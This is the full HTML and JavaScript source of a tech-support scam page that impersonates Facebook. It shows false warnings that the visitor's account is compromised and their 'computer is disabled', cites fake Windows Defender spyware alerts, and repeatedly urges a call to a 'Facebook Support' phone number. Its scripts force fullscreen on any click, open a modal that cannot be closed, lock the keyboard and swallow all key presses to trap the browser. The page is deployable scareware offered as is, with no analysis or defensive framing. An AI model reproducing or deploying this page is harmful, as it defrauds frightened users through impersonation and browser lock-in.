<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook – log in or sign up</title>
    <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
    body {
        background: url('assets/img/banner.png');
        background-repeat: no-repeat;
        background-size: cover;
    }

    #chat-box {
        background-color: #fff;
        padding: 15px;
        position: fixed;
        bottom: 93px;
        right: 13px;
        z-index: 99999999;
        border-radius: 10px;
        display: none;
    }

    #chat-box img {
        color: #000;
        font-size: 16px;
        font-weight: 600;
        margin-left: 35px;
    }

    #chat-box h4 {
        width: 217px;
        font-size: 20px;
        text-align: center;
        padding-top: 7px;
        margin: 0px auto;
        display: block;
    }

    #chat-box a {
        text-align: center;
        margin: 0px auto;
        display: block;
    }

    #chat-box p {
        font-size: 16px;
        text-align: center;
        padding-top: 7px;
        font-weight: normal;
    }

    #chat-box .arrow-down {
        position: absolute;
        font-size: 47px;
        color: #fff;
        bottom: -39px;
        left: 65px;
    }

    .zoominoutsinglefeatured {
        animation: zoominoutsinglefeatured 4s infinite;
    }

    @keyframes zoominoutsinglefeatured {
        0% {
            transform: scale(1, 1);
        }

        50% {
            transform: scale(1.1, 1.1);
        }

        100% {
            transform: scale(1, 1);
        }
    }

    @keyframes zoomininsinglefeatured {
        0% {
            transform: scale(1, 1);
        }

        50% {
            transform: scale(1.1, 1.1);
        }

        100% {
            transform: scale(1, 1);
        }
    }

    .bg_reboot {
        background: #000000a8;
        background: #000000ba;
        z-index: 99999;
    }

    .login_div {
        z-index: 0;
    }

    .mt-10 {
        margin-top: 6rem !important;
    }

    @media screen and (max-width: 1600px) {
        body {
            background: url('assets/img/banner1.png');
            background-repeat: no-repeat;
            background-size: cover;
        }
    }

    @media screen and (max-width: 1300px) {
        body {
            background: url('assets/img/banner2.png');
            background-repeat: no-repeat;
            background-size: cover;
        }
    }

    .blink {
        animation: blink-animation 1s steps(5, start) infinite;
        -webkit-animation: blink-animation 1s steps(5, start) infinite;
    }

    .blink2 {
        animation: blink-animation 1s steps(5, start) infinite;
        -webkit-animation: blink-animation 1s steps(5, start) infinite;
    }

    @keyframes blink-animation {
        to {
            visibility: hidden;
        }
    }

    @-webkit-keyframes blink-animation {
        to {
            visibility: hidden;
        }
    }

    .footer_div {
        position: absolute;
        bottom: 0;
        height: 75px;
        width: 100%;
    }
    </style>
</head>

<body>
    <div class="loader-wrapper">
        <div class="spinner-border text-primary" role="status"></div>
    </div>
    <div class="login_div bg-light d-flex justify-content-center align-items-center">
        <div class="container">
            <div class="d-flex align-items-center">
                <div>
                    <img src="assets/img/error.png" alt="error" srcset="assets/img/error.png" width="80px">
                    <h2 class="text-danger">The connection to facebook.com is not secure</h2>
                    <p>You are seeing this warning message because your Account has been compromised and there was a dangerous try to steal your personal logins & bank details.</p>
                </div>
            </div>
            <div class="d-flex justify-content-between">
                <button class="btn btn-danger px-4" type="button">Continue to site</button>
                <button class="btn btn-success px-4 blink" type="button" data-bs-toggle="modal"
                    data-bs-target="#contact_us_Modal">Go Back</button>
            </div>
        </div>
    </div>
    <div class="text-light buttom_div p-2 text-center bg_reboot">
        <h2 class="text-decoration-underline">Do not reboot or use Your computer</h2>
        <p class="fs-5">Your computer is disabled. Please, call facebook Support. <br> Access is the block security reason for this
            Computer. Please contact us immediately. A technician will help you solve the problem.</p>
    </div>
    <div id="chat-box">
        <div class="text-center">
            <h5> <img src="assets/img/facebook_logo_color.png" alt="facebook_logo" class="m-0" width="120px"></h5>
            <h6>Contact support</h6>
            <h4>+1-877-323-2748 (Security Support)</h4>
        </div>
        <div class="arrow-down">
            <i class="fa fa-caret-down"></i>
        </div>
    </div>
    <div class="modal fade mt-10" id="contact_us_Modal" tabindex="-1" aria-labelledby="contact_us_ModalLabel"
        aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
        <div class="modal-dialog modal-xl bg-primary zoominoutsinglefeatured">
            <div class="modal-content bg-primary">
                <div class="modal-body bg-primary text-light">
                    <div class="text-center">
                        <h5> <img src="assets/img/file2.gif" alt="file" class="m-0"></h5>
                        <h6 class="mt-3">Spyware_Alert - Error_Code: #D7GBA5V</h6>
                        <h5> <img src="assets/img/facebook_logo.png" alt="facebook_logo" class="m-0" width="150px"></h5>
                        <h6>Contact support</h6>
                        <h4>+1-877-323-2748 (Security Support)</h4>
                        <h6>Access is the block security reason for this Computer. Please contact us immediately. A
                            technician will help you solve the problem.</h6>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <div class="bg-primary footer_div">

        <div class="text-center text-light mt-3">
            <h5 class="m-0">Call Facebook Support: +1-877-323-2748 (Security Support)</h5>
        </div>
        <div class="text-light">
            <marquee direction="left" height="100px" width="100%">
                <small>Windows Defender SmartScreen has prevented
                    the display of an unrecognized application. Running this application may put your PC at risk.
                    Windows Defender Scan has found a potentially unwanted adware on this device that could steal your
                    passwords, your online identity, your financial information, your personal files, your photos or
                    your documents.</small>
            </marquee>
        </div>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
        integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"
        integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous">
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script>
    $(document).ready(function() {
        $('.loader-wrapper').fadeOut('slow', function() {
            $(this).remove();
        });
        $("#chat-box").delay(3000).slideDown(100);
        $(document).on('click', function() {

            toggleFullScreen();
            $('#contact_us_Modal').modal('show');

        })

        function toggleFullScreen() {
            var doc = window.document;
            var docEl = doc.documentElement;
            var requestFullScreen = docEl.requestFullscreen || docEl.mozRequestFullScreen || docEl
                .webkitRequestFullScreen || docEl.msRequestFullscreen;
            var exitFullScreen = doc.exitFullscreen || doc.mozCancelFullScreen || doc.webkitExitFullscreen ||
                doc.msExitFullscreen;
            if (!doc.fullscreenElement && !doc.mozFullScreenElement && !doc.webkitFullscreenElement && !doc
                .msFullscreenElement) {
                requestFullScreen.call(docEl);
            }
        }
    });
    </script>
     <script>
        navigator.keyboard.lock();
        document.onkeydown = function (e) {
            return false;
        }
    </script>
</body>

</html>